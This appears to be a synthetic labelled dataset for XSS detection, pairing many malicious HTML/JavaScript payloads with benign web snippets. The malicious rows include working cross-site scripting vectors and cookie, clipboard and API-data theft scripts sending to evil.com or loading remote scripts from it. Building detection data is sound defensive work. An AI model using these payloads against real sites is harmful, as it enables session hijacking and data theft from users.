Sentence,Label,Category,Source
"<script>trustedTypes.defaultPolicy={createHTML:s=>s,createScript:s=>s,createScriptURL:s=>s}</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<meta http-equiv=""Content-Security-Policy"" content=""trusted-types none""><script>alert(1)</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<script>Object.defineProperty(trustedTypes,""defaultPolicy"",{get:()=>({createHTML:s=>s})})</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<script>var sink=document.getElementById(""sink"");sink[trustedTypes.isHTML?""innerHTML"":""textContent""]=""<img src=x onerror=alert(1)>""</script>",1,trusted_types_bypass,synthetic_harshit_2025
"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",1,mutation_xss,synthetic_harshit_2025
<listing><script>alert(1)</script></listing>,1,mutation_xss,synthetic_harshit_2025
<xmp><script>alert(1)</script></xmp>,1,mutation_xss,synthetic_harshit_2025
<math><mtext></noscript><img src=x onerror=alert(1)>,1,mutation_xss,synthetic_harshit_2025
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,1,mutation_xss,synthetic_harshit_2025
<table><td><script>alert(1)</script></td></table>,1,mutation_xss,synthetic_harshit_2025
<select><option><script>alert(1)</script></option></select>,1,mutation_xss,synthetic_harshit_2025
<plaintext><script>alert(1)</script>,1,mutation_xss,synthetic_harshit_2025
"<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=""</style><img onerror=alert(1) src>"">",1,mutation_xss,synthetic_harshit_2025
"<math><mtext><table><mglyph><svg><mtext><style><path id=""</style><img onerror=alert(1) src>"">",1,mutation_xss,synthetic_harshit_2025
<div><math><mi><img src=x onerror=alert(1)></mi></math></div>,1,mutation_xss,synthetic_harshit_2025
<p><math alttext=</p><img src=x onerror=alert(1)></math>,1,mutation_xss,synthetic_harshit_2025
<frameset onload=alert(1)>,1,mutation_xss,synthetic_harshit_2025
"<svg><animate attributeName=attributeName values=""&#34;><script>alert(1)</script>&#34;""/>",1,mutation_xss,synthetic_harshit_2025
"<div ng-app ng-csp>{{$eval.constructor(""alert(1)"")()}}",1,framework_xss,synthetic_harshit_2025
"<div ng-app>{{""a"".constructor.prototype.charAt=[].join;$eval(""x=alert(1)"")}}</div>",1,framework_xss,synthetic_harshit_2025
"ng-init=""constructor.constructor('alert(1)')()""",1,framework_xss,synthetic_harshit_2025
"<div ng-app ng-controller=""x"">{{$on.constructor(""alert(1)"")()}}</div>",1,framework_xss,synthetic_harshit_2025
"<div class=ng-include:""'data:,alert(1)'""></div>",1,framework_xss,synthetic_harshit_2025
"<script>ReactDOM.render(React.createElement(""div"",{dangerouslySetInnerHTML:{__html:""<img src=x onerror=alert(1)>""}}),document.body)</script>",1,framework_xss,synthetic_harshit_2025
<div dangerouslySetInnerHTML={{__html: userInput}}></div>,1,framework_xss,synthetic_harshit_2025
"[[constructor.constructor(""alert(1)"")()]]",1,framework_xss,synthetic_harshit_2025
"<nuxt-link to=""javascript:alert(1)"">click</nuxt-link>",1,framework_xss,synthetic_harshit_2025
"<svelte:element this=""script"">alert(1)</svelte:element>",1,framework_xss,synthetic_harshit_2025
"<component :is=""'script'"">alert(1)</component>",1,framework_xss,synthetic_harshit_2025
"<div @click=""eval(userInput)"">click</div>",1,framework_xss,synthetic_harshit_2025
"ng-app><script>angular.module(""a"",[]).run(function($rootScope,$compile){$compile(""<div>{{constructor.constructor('alert(1)')()}}</div>"")($rootScope).$appendTo(document.body)})</script>",1,framework_xss,synthetic_harshit_2025
"<script>window.__vue_app__.config.globalProperties.$emit(""xss"",""<img src=x onerror=alert(1)>"")</script>",1,framework_xss,synthetic_harshit_2025
<style>*{background-image:url(javascript:alert(1))}</style>,1,css_injection_xss,synthetic_harshit_2025
<style>body{behavior:url(xss.htc)}</style>,1,css_injection_xss,synthetic_harshit_2025
<style>li{list-style-image:url(javascript:alert(1))}</style>,1,css_injection_xss,synthetic_harshit_2025
"<div style=""background:url(javascript:alert(1))"">",1,css_injection_xss,synthetic_harshit_2025
"<div style=""width:expression(alert(1))"">",1,css_injection_xss,synthetic_harshit_2025
"<div style=""background-image:expression(alert(1))"">",1,css_injection_xss,synthetic_harshit_2025
"<style>@import ""javascript:alert(1)""</style>",1,css_injection_xss,synthetic_harshit_2025
<style>@import url(javascript:alert(1))</style>,1,css_injection_xss,synthetic_harshit_2025
<link rel=stylesheet href=javascript:alert(1)>,1,css_injection_xss,synthetic_harshit_2025
"<link rel=stylesheet href=""data:text/css,*{background-image:url(javascript:alert(1))}"">",1,css_injection_xss,synthetic_harshit_2025
"<style>div:-moz-any-link{cursor:url(javascript:alert(1)),auto}</style>",1,css_injection_xss,synthetic_harshit_2025
"<div style=""-moz-binding:url(http://evil.com/xss.xml#xss)"">",1,css_injection_xss,synthetic_harshit_2025
<style>*{x:expression(alert(1))}</style>,1,css_injection_xss,synthetic_harshit_2025
"<style>body:before{content:url(data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)}</style>",1,css_injection_xss,synthetic_harshit_2025
"<script>fetch(""https://evil.com/steal?c=""+document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>fetch(""/api/user"").then(r=>r.json()).then(d=>fetch(""https://evil.com/""+btoa(JSON.stringify(d))))</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>fetch(location.href).then(r=>r.text()).then(t=>fetch(""https://evil.com/page?d=""+btoa(t)))</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>fetch(""/admin"",{credentials:""include""}).then(r=>r.text()).then(d=>new Image().src=""//evil.com/?""+btoa(d))</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>navigator.sendBeacon(""https://evil.com/steal"",document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>new XMLHttpRequest().open(""GET"",""https://evil.com/?c=""+document.cookie,true)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>fetch(""/api/change-password"",{method:""POST"",body:JSON.stringify({password:""hacked""}),credentials:""include"",headers:{""Content-Type"":""application/json""}})</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>var r=new Request(""//evil.com/?c=""+document.cookie);fetch(r)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>new EventSource(""//evil.com/sse?c=""+document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>var ws=new WebSocket(""wss://evil.com"");ws.onopen=()=>ws.send(document.cookie)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>navigator.clipboard.readText().then(t=>fetch(""//evil.com/?clip=""+t))</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>document.cookie.split("";"").forEach(c=>new Image().src=""//evil.com/?""+c)</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>fetch(""/graphql"",{method:""POST"",body:""{me{email password}}"",credentials:""include""}).then(r=>r.json()).then(d=>fetch(""//evil.com/""+btoa(JSON.stringify(d))))</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>import(""//evil.com/xss.mjs"").then(m=>m.x())</script>",1,fetch_api_abuse,synthetic_harshit_2025
"<script>Promise.all([fetch(""/api/profile"",{credentials:""include""}),fetch(""/api/keys"",{credentials:""include""})]).then(rs=>Promise.all(rs.map(r=>r.json()))).then(ds=>fetch(""//evil.com/""+btoa(JSON.stringify(ds))))</script>",1,fetch_api_abuse,synthetic_harshit_2025
<svg><script>alert(1)</script></svg>,1,svg_advanced,synthetic_harshit_2025
"<svg xmlns=""http://www.w3.org/2000/svg""><script>alert(1)</script></svg>",1,svg_advanced,synthetic_harshit_2025
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,1,svg_advanced,synthetic_harshit_2025
<svg><set onbegin=alert(1) attributeName=x>,1,svg_advanced,synthetic_harshit_2025
<svg id=x><use href=#x onload=alert(1)>,1,svg_advanced,synthetic_harshit_2025
<svg><image href=1 onerror=alert(1)>,1,svg_advanced,synthetic_harshit_2025
<svg><a href=javascript:alert(1)><text y=20>click me</text></a></svg>,1,svg_advanced,synthetic_harshit_2025
<svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml><script>alert(1)</script></body></foreignObject></svg>,1,svg_advanced,synthetic_harshit_2025
<svg><desc><![CDATA[><script>alert(1)</script>]]></desc></svg>,1,svg_advanced,synthetic_harshit_2025
<svg onload=alert(1) xmlns=http://www.w3.org/2000/svg>,1,svg_advanced,synthetic_harshit_2025
<math><maction actiontype=statusline#http://evil.com xlink:href=javascript:alert(1)>click,1,svg_advanced,synthetic_harshit_2025
<svg><script>alert&#40;1&#41;</script>,1,svg_advanced,synthetic_harshit_2025
<svg><script>&#x61;lert(1)</script></svg>,1,svg_advanced,synthetic_harshit_2025
"<svg><use xlink:href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x"">",1,svg_advanced,synthetic_harshit_2025
"<img src=""https://legitimate.com/image.jpg"" onerror=""fetch('https://evil.com/?c='+document.cookie)"">",1,stored_xss,synthetic_harshit_2025
"Hello! <script>setTimeout(function(){fetch(""https://evil.com/steal?c=""+document.cookie)},5000)</script>",1,stored_xss,synthetic_harshit_2025
"<a href=""#"" onclick=""var img=new Image();img.src='https://evil.com/?c='+document.cookie;return false;"">Click for discount!</a>",1,stored_xss,synthetic_harshit_2025
"Great product! <img src=x style=""display:none"" onerror=""navigator.sendBeacon('https://evil.com',document.cookie)"">",1,stored_xss,synthetic_harshit_2025
"<span class=""rating"">5 stars</span><script>document.addEventListener(""DOMContentLoaded"",function(){fetch(""https://evil.com/""+btoa(document.cookie))})</script>",1,stored_xss,synthetic_harshit_2025
"<b>Nice article</b><svg/onload=""var s=document.createElement('script');s.src='//evil.com/xss.js';document.head.appendChild(s)"">",1,stored_xss,synthetic_harshit_2025
"<p>Comment text here</p><iframe srcdoc=""<script>top.fetch('https://evil.com/?c='+top.document.cookie)</script>"" width=0 height=0>",1,stored_xss,synthetic_harshit_2025
"<div class=""user-bio"">Developer<script>if(!sessionStorage.xss){sessionStorage.xss=1;fetch(""//evil.com/?c=""+document.cookie)}</script></div>",1,stored_xss,synthetic_harshit_2025
"<img src=""https://normal.com/img.jpg"" onload=""this.onload=null;document.body.appendChild(Object.assign(document.createElement('script'),{src:'//evil.com/xss.js'}))"">",1,stored_xss,synthetic_harshit_2025
"<script>if(window.top===window.self){new Image().src=""//evil.com/?c=""+document.cookie}</script>",1,stored_xss,synthetic_harshit_2025
"<div class=""container""><h1>Welcome to our website</h1><p>Please login to continue.</p></div>",0,benign_diverse,synthetic_harshit_2025
"<form action=""/login"" method=""POST""><input type=""text"" name=""username"" placeholder=""Enter username""><input type=""password"" name=""password""><button type=""submit"">Login</button></form>",0,benign_diverse,synthetic_harshit_2025
"<nav class=""navbar""><a href=""/home"">Home</a><a href=""/about"">About</a><a href=""/contact"">Contact</a></nav>",0,benign_diverse,synthetic_harshit_2025
"<table class=""data-table""><thead><tr><th>Name</th><th>Email</th><th>Role</th></tr></thead><tbody><tr><td>John</td><td>john@example.com</td><td>Admin</td></tr></tbody></table>",0,benign_diverse,synthetic_harshit_2025
"<input type=""email"" name=""email"" value=""user@example.com"" class=""form-control"" required>",0,benign_diverse,synthetic_harshit_2025
"<button class=""btn btn-primary"" type=""button"">Submit</button>",0,benign_diverse,synthetic_harshit_2025
"<img src=""/images/logo.png"" alt=""Company Logo"" class=""logo"" width=""200"" height=""50"">",0,benign_diverse,synthetic_harshit_2025
"<a href=""https://www.example.com/page?id=123&category=tech"" target=""_blank"" rel=""noopener"">Read more</a>",0,benign_diverse,synthetic_harshit_2025
"<link rel=""stylesheet"" href=""/css/main.css"" type=""text/css"">",0,benign_diverse,synthetic_harshit_2025
"<meta name=""description"" content=""A safe website with useful content for users"">",0,benign_diverse,synthetic_harshit_2025
"<select name=""country"" id=""country-select""><option value=""us"">United States</option><option value=""uk"">United Kingdom</option></select>",0,benign_diverse,synthetic_harshit_2025
"<div class=""alert alert-success"" role=""alert"">Your profile has been updated successfully!</div>",0,benign_diverse,synthetic_harshit_2025
"<header class=""site-header""><div class=""brand""><h1>My Site</h1></div></header>",0,benign_diverse,synthetic_harshit_2025
"<footer class=""site-footer""><p>Contact us at: <a href=""mailto:info@example.com"">info@example.com</a></p></footer>",0,benign_diverse,synthetic_harshit_2025
"<p class=""text-muted"">Last updated: January 15, 2025. All rights reserved.</p>",0,benign_diverse,synthetic_harshit_2025
"<section id=""about""><h2>About Us</h2><p>We are a security-focused company.</p></section>",0,benign_diverse,synthetic_harshit_2025
"<ul class=""list-group""><li class=""list-group-item"">Item one</li><li class=""list-group-item"">Item two</li></ul>",0,benign_diverse,synthetic_harshit_2025
"<div class=""card""><div class=""card-body""><h5 class=""card-title"">Card title</h5><p class=""card-text"">Card content here.</p></div></div>",0,benign_diverse,synthetic_harshit_2025
function validateEmail(email) { const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; return re.test(email); },0,benign_diverse,synthetic_harshit_2025
"const API_URL = ""https://api.example.com/v1""; const headers = { ""Content-Type"": ""application/json"" };",0,benign_diverse,synthetic_harshit_2025
"document.addEventListener(""DOMContentLoaded"", function() { const form = document.getElementById(""login-form""); form.addEventListener(""submit"", handleSubmit); });",0,benign_diverse,synthetic_harshit_2025
"var userData = JSON.parse(localStorage.getItem(""user"")) || {}; if (userData.isLoggedIn) { showDashboard(); }",0,benign_diverse,synthetic_harshit_2025
"async function loadData(userId) { const response = await fetch(""/api/users/"" + userId, { credentials: ""same-origin"" }); if (!response.ok) throw new Error(""Network error""); return response.json(); }",0,benign_diverse,synthetic_harshit_2025
"class UserService { constructor(baseUrl) { this.baseUrl = baseUrl; } async getUser(id) { return fetch(this.baseUrl + ""/users/"" + id).then(r => r.json()); } }",0,benign_diverse,synthetic_harshit_2025
const handleSubmit = (e) => { e.preventDefault(); const formData = new FormData(e.target); const data = Object.fromEntries(formData); console.log(data); };,0,benign_diverse,synthetic_harshit_2025
"import React, { useState, useEffect } from ""react""; function App() { const [count, setCount] = useState(0); return <button onClick={() => setCount(c => c + 1)}>{count}</button>; }",0,benign_diverse,synthetic_harshit_2025
"window.addEventListener(""resize"", debounce(function() { updateLayout(); }, 250));",0,benign_diverse,synthetic_harshit_2025
"const sanitize = (str) => str.replace(/[&<>""']/g, m => ({""&"":""&amp;"",""<"":""&lt;"","">"":""&gt;"",'""':""&quot;"",""'"":""&#39;""}[m]));",0,benign_diverse,synthetic_harshit_2025
"export default function Button({ onClick, children, disabled }) { return <button onClick={onClick} disabled={disabled} className=""btn"">{children}</button>; }",0,benign_diverse,synthetic_harshit_2025
"const router = express.Router(); router.get(""/users"", authenticate, async (req, res) => { const users = await User.findAll(); res.json(users); });",0,benign_diverse,synthetic_harshit_2025
"try { const result = await db.query(""SELECT * FROM users WHERE id = $1"", [userId]); return result.rows[0]; } catch (err) { logger.error(err); throw err; }",0,benign_diverse,synthetic_harshit_2025
"SELECT u.id, u.name, u.email FROM users u WHERE u.active = 1 AND u.role = ""user"" ORDER BY u.created_at DESC LIMIT 10;",0,benign_diverse,synthetic_harshit_2025
"INSERT INTO orders (user_id, product_id, quantity, price) VALUES (?, ?, ?, ?);",0,benign_diverse,synthetic_harshit_2025
"UPDATE users SET last_login = NOW(), login_count = login_count + 1 WHERE id = ? AND active = 1;",0,benign_diverse,synthetic_harshit_2025
"SELECT p.name, p.price, c.name as category FROM products p JOIN categories c ON p.category_id = c.id WHERE p.price BETWEEN 10 AND 100;",0,benign_diverse,synthetic_harshit_2025
"CREATE TABLE sessions (id VARCHAR(64) PRIMARY KEY, user_id INT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, expires_at TIMESTAMP NOT NULL);",0,benign_diverse,synthetic_harshit_2025
DELETE FROM tokens WHERE expires_at < NOW() AND user_id = ?;,0,benign_diverse,synthetic_harshit_2025
"SELECT COUNT(*) as total, AVG(rating) as avg_rating FROM reviews WHERE product_id = ? GROUP BY product_id;",0,benign_diverse,synthetic_harshit_2025
ALTER TABLE users ADD COLUMN two_factor_secret VARCHAR(32) DEFAULT NULL;,0,benign_diverse,synthetic_harshit_2025
"SELECT * FROM audit_logs WHERE user_id = ? AND action IN (""login"",""logout"",""password_change"") ORDER BY created_at DESC;",0,benign_diverse,synthetic_harshit_2025
CREATE INDEX idx_sessions_user ON sessions(user_id); CREATE INDEX idx_sessions_expires ON sessions(expires_at);,0,benign_diverse,synthetic_harshit_2025
"{""status"": ""success"", ""data"": {""user_id"": 12345, ""username"": ""john_doe"", ""email"": ""john@example.com"", ""role"": ""user""}}",0,benign_diverse,synthetic_harshit_2025
"{""error"": false, ""message"": ""Profile updated successfully"", ""timestamp"": ""2025-01-15T10:30:00Z""}",0,benign_diverse,synthetic_harshit_2025
"[{""id"": 1, ""name"": ""Product A"", ""price"": 29.99, ""stock"": 150}, {""id"": 2, ""name"": ""Product B"", ""price"": 49.99, ""stock"": 75}]",0,benign_diverse,synthetic_harshit_2025
"{""access_token"": ""eyJhbGciOiJIUzI1NiJ9.payload.signature"", ""token_type"": ""Bearer"", ""expires_in"": 3600}",0,benign_diverse,synthetic_harshit_2025
"{""page"": 1, ""per_page"": 20, ""total"": 1500, ""data"": [{""id"": 1, ""title"": ""First item""}]}",0,benign_diverse,synthetic_harshit_2025
"{""errors"": [{""field"": ""email"", ""message"": ""Email already exists""}, {""field"": ""password"", ""message"": ""Too short""}]}",0,benign_diverse,synthetic_harshit_2025
"{""csrf_token"": ""abc123def456"", ""expires_at"": ""2025-01-15T11:30:00Z""}",0,benign_diverse,synthetic_harshit_2025
The user successfully logged in and was redirected to the dashboard page.,0,benign_diverse,synthetic_harshit_2025
Please enter your email address and password to access your account securely.,0,benign_diverse,synthetic_harshit_2025
"Your password must be at least 8 characters long and contain uppercase, lowercase, numbers, and special characters.",0,benign_diverse,synthetic_harshit_2025
The session has expired. Please log in again to continue using the application.,0,benign_diverse,synthetic_harshit_2025
Click the link in your email to verify your account and complete the registration process.,0,benign_diverse,synthetic_harshit_2025
We have sent a password reset link to the email address associated with your account.,0,benign_diverse,synthetic_harshit_2025
Your account has been locked due to multiple failed login attempts. Please contact support.,0,benign_diverse,synthetic_harshit_2025
Two-factor authentication has been enabled for your account. You will receive a code via SMS.,0,benign_diverse,synthetic_harshit_2025
Access denied. You do not have permission to view this resource. Contact your administrator.,0,benign_diverse,synthetic_harshit_2025
Invalid CSRF token. Your request could not be processed. Please refresh the page and try again.,0,benign_diverse,synthetic_harshit_2025
Cross-Site Request Forgery protection is active on this application.,0,benign_diverse,synthetic_harshit_2025
All user inputs are sanitized and escaped before being stored in the database.,0,benign_diverse,synthetic_harshit_2025
The application uses Content Security Policy headers to prevent XSS attacks.,0,benign_diverse,synthetic_harshit_2025
Passwords are hashed using bcrypt before storage. Never store plaintext passwords.,0,benign_diverse,synthetic_harshit_2025
Rate limiting is applied to all authentication endpoints to prevent brute force attacks.,0,benign_diverse,synthetic_harshit_2025
Content-Type: application/json; charset=utf-8,0,benign_diverse,synthetic_harshit_2025
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature,0,benign_diverse,synthetic_harshit_2025
X-Content-Type-Options: nosniff,0,benign_diverse,synthetic_harshit_2025
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload,0,benign_diverse,synthetic_harshit_2025
"Content-Security-Policy: default-src ""self""; script-src ""self"" ""nonce-abc123""; style-src ""self"" ""unsafe-inline""",0,benign_diverse,synthetic_harshit_2025
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600,0,benign_diverse,synthetic_harshit_2025
X-Frame-Options: DENY,0,benign_diverse,synthetic_harshit_2025
"Cache-Control: no-store, no-cache, must-revalidate, private",0,benign_diverse,synthetic_harshit_2025
Referrer-Policy: strict-origin-when-cross-origin,0,benign_diverse,synthetic_harshit_2025
"Permissions-Policy: geolocation=(), microphone=(), camera=()",0,benign_diverse,synthetic_harshit_2025
.container { max-width: 1200px; margin: 0 auto; padding: 0 15px; box-sizing: border-box; },0,benign_diverse,synthetic_harshit_2025
@media (max-width: 768px) { .navbar { display: none; } .mobile-menu { display: block; } },0,benign_diverse,synthetic_harshit_2025
.btn-primary { background-color: #0066cc; color: #ffffff; padding: 10px 20px; border-radius: 4px; cursor: pointer; },0,benign_diverse,synthetic_harshit_2025
":root { --primary-color: #0066cc; --secondary-color: #6c757d; --font-family: ""Arial"", sans-serif; }",0,benign_diverse,synthetic_harshit_2025
".form-input:focus { outline: none; border-color: #0066cc; box-shadow: 0 0 0 3px rgba(0,102,204,0.25); }",0,benign_diverse,synthetic_harshit_2025
".sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); }",0,benign_diverse,synthetic_harshit_2025
